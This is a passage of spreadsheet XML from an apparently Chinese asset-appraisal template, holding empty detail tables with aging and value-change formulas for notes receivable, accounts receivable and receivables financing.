      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="578" t="n"/>
      <c r="E25" s="578" t="n"/>
      <c r="F25" s="585" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555" t="n"/>
      <c r="I25" s="555">
        <f>H25-G25</f>
        <v/>
      </c>
      <c r="J25" s="555">
        <f>IF(G25=0,"",I25/G25*100)</f>
        <v/>
      </c>
      <c r="K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0" t="n"/>
      <c r="E26" s="115" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="555">
        <f>ROUND(SUM(G6:G25),2)</f>
        <v/>
      </c>
      <c r="H26" s="555">
        <f>ROUND(SUM(H6:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>H26-G26</f>
        <v/>
      </c>
      <c r="J26" s="555">
        <f>IF(G26=0,"",I26/G26*100)</f>
        <v/>
      </c>
      <c r="K26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="185" t="inlineStr">
        <is>
          <t>减：应收票据坏账准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="555" t="n"/>
      <c r="I27" s="555">
        <f>H27-G27</f>
        <v/>
      </c>
      <c r="J27" s="555">
        <f>IF(G27=0,"",I27/G27*100)</f>
        <v/>
      </c>
      <c r="K27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>预计损失</t>
        </is>
      </c>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>减：应收票据预计损失</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="555" t="n"/>
      <c r="I28" s="555">
        <f>H28-G28</f>
        <v/>
      </c>
      <c r="J28" s="555">
        <f>IF(G28=0,"",I28/G28*100)</f>
        <v/>
      </c>
      <c r="K28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合           计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="383" t="n"/>
      <c r="F29" s="383" t="n"/>
      <c r="G29" s="555">
        <f>ROUND(G26-G27,2)</f>
        <v/>
      </c>
      <c r="H29" s="555">
        <f>ROUND(H26-H28,2)</f>
        <v/>
      </c>
      <c r="I29" s="555">
        <f>H29-G29</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>IF(G29=0,"",I29/G29*100)</f>
        <v/>
      </c>
      <c r="K29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B1:K1"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B2:K2"/>
    <mergeCell ref="B27:C27"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:K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4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codeName="Sheet20">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N31"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A25" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.5" customWidth="1" style="410" min="2" max="2"/>
    <col width="23.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="12.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="16.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="11" customWidth="1" style="410" min="7" max="9"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="12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应收账款评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表3-5</t>
        </is>
      </c>
    </row>
    <row r="4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586" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.8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欠款单位名称（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>业务内容</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账龄</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
          <t>外币账面金额</t>
        </is>
      </c>
      <c r="I5" s="379" t="inlineStr">
        <is>
          <t>评估基准日汇率</t>
        </is>
      </c>
      <c r="J5" s="307" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="M5" s="380" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="N5" s="380" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" ht="16.5" customHeight="1" s="415">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="380" t="n"/>
      <c r="E6" s="587" t="n"/>
      <c r="F6" s="380">
        <f>IF(E6="","",LOOKUP(DATEDIF(E6,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G6" s="185" t="n"/>
      <c r="H6" s="580" t="n"/>
      <c r="I6" s="588" t="n"/>
      <c r="J6" s="555" t="n"/>
      <c r="K6" s="555" t="n"/>
      <c r="L6" s="555">
        <f>K6-J6</f>
        <v/>
      </c>
      <c r="M6" s="555">
        <f>IF(J6=0,"",L6/J6*100)</f>
        <v/>
      </c>
      <c r="N6" s="383" t="n"/>
    </row>
    <row r="7" ht="16.5" customHeight="1" s="415">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="380">
        <f>IF(E7="","",LOOKUP(DATEDIF(E7,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="580" t="n"/>
      <c r="I7" s="588" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555">
        <f>K7-J7</f>
        <v/>
      </c>
      <c r="M7" s="555">
        <f>IF(J7=0,"",L7/J7*100)</f>
        <v/>
      </c>
      <c r="N7" s="383" t="n"/>
    </row>
    <row r="8" ht="16.5" customHeight="1" s="415">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="380">
        <f>IF(E8="","",LOOKUP(DATEDIF(E8,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="580" t="n"/>
      <c r="I8" s="588" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555">
        <f>K8-J8</f>
        <v/>
      </c>
      <c r="M8" s="555">
        <f>IF(J8=0,"",L8/J8*100)</f>
        <v/>
      </c>
      <c r="N8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="380">
        <f>IF(E9="","",LOOKUP(DATEDIF(E9,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="580" t="n"/>
      <c r="I9" s="588" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555">
        <f>K9-J9</f>
        <v/>
      </c>
      <c r="M9" s="555">
        <f>IF(J9=0,"",L9/J9*100)</f>
        <v/>
      </c>
      <c r="N9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="587" t="n"/>
      <c r="F10" s="380">
        <f>IF(E10="","",LOOKUP(DATEDIF(E10,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="580" t="n"/>
      <c r="I10" s="588" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555">
        <f>K10-J10</f>
        <v/>
      </c>
      <c r="M10" s="555">
        <f>IF(J10=0,"",L10/J10*100)</f>
        <v/>
      </c>
      <c r="N10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="587" t="n"/>
      <c r="F11" s="380">
        <f>IF(E11="","",LOOKUP(DATEDIF(E11,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="580" t="n"/>
      <c r="I11" s="588" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555">
        <f>K11-J11</f>
        <v/>
      </c>
      <c r="M11" s="555">
        <f>IF(J11=0,"",L11/J11*100)</f>
        <v/>
      </c>
      <c r="N11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="587" t="n"/>
      <c r="F12" s="380">
        <f>IF(E12="","",LOOKUP(DATEDIF(E12,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="580" t="n"/>
      <c r="I12" s="588" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555">
        <f>K12-J12</f>
        <v/>
      </c>
      <c r="M12" s="555">
        <f>IF(J12=0,"",L12/J12*100)</f>
        <v/>
      </c>
      <c r="N12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="587" t="n"/>
      <c r="F13" s="380">
        <f>IF(E13="","",LOOKUP(DATEDIF(E13,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="580" t="n"/>
      <c r="I13" s="588" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555">
        <f>K13-J13</f>
        <v/>
      </c>
      <c r="M13" s="555">
        <f>IF(J13=0,"",L13/J13*100)</f>
        <v/>
      </c>
      <c r="N13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="587" t="n"/>
      <c r="F14" s="380">
        <f>IF(E14="","",LOOKUP(DATEDIF(E14,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="580" t="n"/>
      <c r="I14" s="588" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555">
        <f>K14-J14</f>
        <v/>
      </c>
      <c r="M14" s="555">
        <f>IF(J14=0,"",L14/J14*100)</f>
        <v/>
      </c>
      <c r="N14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="587" t="n"/>
      <c r="F15" s="380">
        <f>IF(E15="","",LOOKUP(DATEDIF(E15,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="580" t="n"/>
      <c r="I15" s="588" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555">
        <f>K15-J15</f>
        <v/>
      </c>
      <c r="M15" s="555">
        <f>IF(J15=0,"",L15/J15*100)</f>
        <v/>
      </c>
      <c r="N15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="587" t="n"/>
      <c r="F16" s="380">
        <f>IF(E16="","",LOOKUP(DATEDIF(E16,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="580" t="n"/>
      <c r="I16" s="588" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555">
        <f>K16-J16</f>
        <v/>
      </c>
      <c r="M16" s="555">
        <f>IF(J16=0,"",L16/J16*100)</f>
        <v/>
      </c>
      <c r="N16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="587" t="n"/>
      <c r="F17" s="380">
        <f>IF(E17="","",LOOKUP(DATEDIF(E17,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="580" t="n"/>
      <c r="I17" s="588" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555">
        <f>K17-J17</f>
        <v/>
      </c>
      <c r="M17" s="555">
        <f>IF(J17=0,"",L17/J17*100)</f>
        <v/>
      </c>
      <c r="N17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="587" t="n"/>
      <c r="F18" s="380">
        <f>IF(E18="","",LOOKUP(DATEDIF(E18,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="580" t="n"/>
      <c r="I18" s="588" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555">
        <f>K18-J18</f>
        <v/>
      </c>
      <c r="M18" s="555">
        <f>IF(J18=0,"",L18/J18*100)</f>
        <v/>
      </c>
      <c r="N18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="587" t="n"/>
      <c r="F19" s="380">
        <f>IF(E19="","",LOOKUP(DATEDIF(E19,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="580" t="n"/>
      <c r="I19" s="588" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555">
        <f>K19-J19</f>
        <v/>
      </c>
      <c r="M19" s="555">
        <f>IF(J19=0,"",L19/J19*100)</f>
        <v/>
      </c>
      <c r="N19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="587" t="n"/>
      <c r="F20" s="380">
        <f>IF(E20="","",LOOKUP(DATEDIF(E20,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="580" t="n"/>
      <c r="I20" s="588" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555">
        <f>K20-J20</f>
        <v/>
      </c>
      <c r="M20" s="555">
        <f>IF(J20=0,"",L20/J20*100)</f>
        <v/>
      </c>
      <c r="N20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="587" t="n"/>
      <c r="F21" s="380">
        <f>IF(E21="","",LOOKUP(DATEDIF(E21,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="580" t="n"/>
      <c r="I21" s="588" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555">
        <f>K21-J21</f>
        <v/>
      </c>
      <c r="M21" s="555">
        <f>IF(J21=0,"",L21/J21*100)</f>
        <v/>
      </c>
      <c r="N21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="587" t="n"/>
      <c r="F22" s="380">
        <f>IF(E22="","",LOOKUP(DATEDIF(E22,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="580" t="n"/>
      <c r="I22" s="588" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555">
        <f>K22-J22</f>
        <v/>
      </c>
      <c r="M22" s="555">
        <f>IF(J22=0,"",L22/J22*100)</f>
        <v/>
      </c>
      <c r="N22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="587" t="n"/>
      <c r="F23" s="380">
        <f>IF(E23="","",LOOKUP(DATEDIF(E23,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="580" t="n"/>
      <c r="I23" s="588" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555">
        <f>K23-J23</f>
        <v/>
      </c>
      <c r="M23" s="555">
        <f>IF(J23=0,"",L23/J23*100)</f>
        <v/>
      </c>
      <c r="N23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="587" t="n"/>
      <c r="F24" s="380">
        <f>IF(E24="","",LOOKUP(DATEDIF(E24,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="580" t="n"/>
      <c r="I24" s="588" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555">
        <f>K24-J24</f>
        <v/>
      </c>
      <c r="M24" s="555">
        <f>IF(J24=0,"",L24/J24*100)</f>
        <v/>
      </c>
      <c r="N24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="587" t="n"/>
      <c r="F25" s="380">
        <f>IF(E25="","",LOOKUP(DATEDIF(E25,评估基准日,"y"),公式数据表!$C$7:$C$10,公式数据表!$B$7:$B$10))</f>
        <v/>
      </c>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="580" t="n"/>
      <c r="I25" s="588" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555">
        <f>K25-J25</f>
        <v/>
      </c>
      <c r="M25" s="555">
        <f>IF(J25=0,"",L25/J25*100)</f>
        <v/>
      </c>
      <c r="N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0" t="n"/>
      <c r="E26" s="115" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="580">
        <f>ROUND(SUM(H6:H25),2)</f>
        <v/>
      </c>
      <c r="I26" s="380" t="n"/>
      <c r="J26" s="555">
        <f>ROUND(SUM(J6:J25),2)</f>
        <v/>
      </c>
      <c r="K26" s="555">
        <f>ROUND(SUM(K6:K25),2)</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>K26-J26</f>
        <v/>
      </c>
      <c r="M26" s="555">
        <f>IF(J26=0,"",L26/J26*100)</f>
        <v/>
      </c>
      <c r="N26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>坏账准备</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>减：应收账款坏账准备</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="115" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="380" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555">
        <f>K27-J27</f>
        <v/>
      </c>
      <c r="M27" s="555">
        <f>IF(J27=0,"",L27/J27*100)</f>
        <v/>
      </c>
      <c r="N27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="inlineStr">
        <is>
          <t>预计损失</t>
        </is>
      </c>
      <c r="B28" s="185" t="inlineStr">
        <is>
          <t>减：应收账款预计损失</t>
        </is>
      </c>
      <c r="C28" s="567" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="115" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
      <c r="I28" s="380" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555" t="n"/>
      <c r="L28" s="555">
        <f>K28-J28</f>
        <v/>
      </c>
      <c r="M28" s="555">
        <f>IF(J28=0,"",L28/J28*100)</f>
        <v/>
      </c>
      <c r="N28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计2</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="383" t="n"/>
      <c r="E29" s="115" t="n"/>
      <c r="F29" s="383" t="n"/>
      <c r="G29" s="383" t="n"/>
      <c r="H29" s="580">
        <f>ROUND(H26-H27,2)</f>
        <v/>
      </c>
      <c r="I29" s="383" t="n"/>
      <c r="J29" s="555">
        <f>ROUND(J26-J27,2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>ROUND(K26-K28,2)</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>K29-J29</f>
        <v/>
      </c>
      <c r="M29" s="555">
        <f>IF(J29=0,"",L29/J29*100)</f>
        <v/>
      </c>
      <c r="N29" s="383" t="n"/>
    </row>
    <row r="30" s="415">
      <c r="A30" s="116" t="n"/>
    </row>
    <row r="31" s="415">
      <c r="A31" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="6">
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B1:N1"/>
    <mergeCell ref="B28:C28"/>
    <mergeCell ref="B26:C26"/>
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B2:N2"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:N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3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codeName="Sheet21">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="12.8333333333333" customWidth="1" style="410" min="1" max="1"/>
    <col width="10.8333333333333" customWidth="1" style="410" min="2" max="2"/>
    <col width="23.1666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="11" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="11" customWidth="1" style="410" min="7" max="9"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="11"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="12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应收款项融资评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="14" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="14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373" t="n"/>
      <c r="M3" s="373" t="n"/>
      <c r="N3" s="402" t="inlineStr">
        <is>
          <t>表3-6</t>
        </is>
      </c>
    </row>
    <row r="4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586" t="n"/>
      <c r="K4" s="376" t="n"/>
      <c r="L4" s="376" t="n"/>
      <c r="M4" s="376" t="n"/>
      <c r="N4" s="402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="16.8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欠款单位名称（结算对象)</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>业务内容</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>发生日期</t>
        </is>
      </c>
      <c r="F5" s="380" t="inlineStr">
        <is>
          <t>账龄</t>
        </is>
      </c>
      <c r="G5" s="379" t="inlineStr">
        <is>
          <t>币种</t>
        </is>
      </c>
      <c r="H5" s="379" t="inlineStr">
        <is>
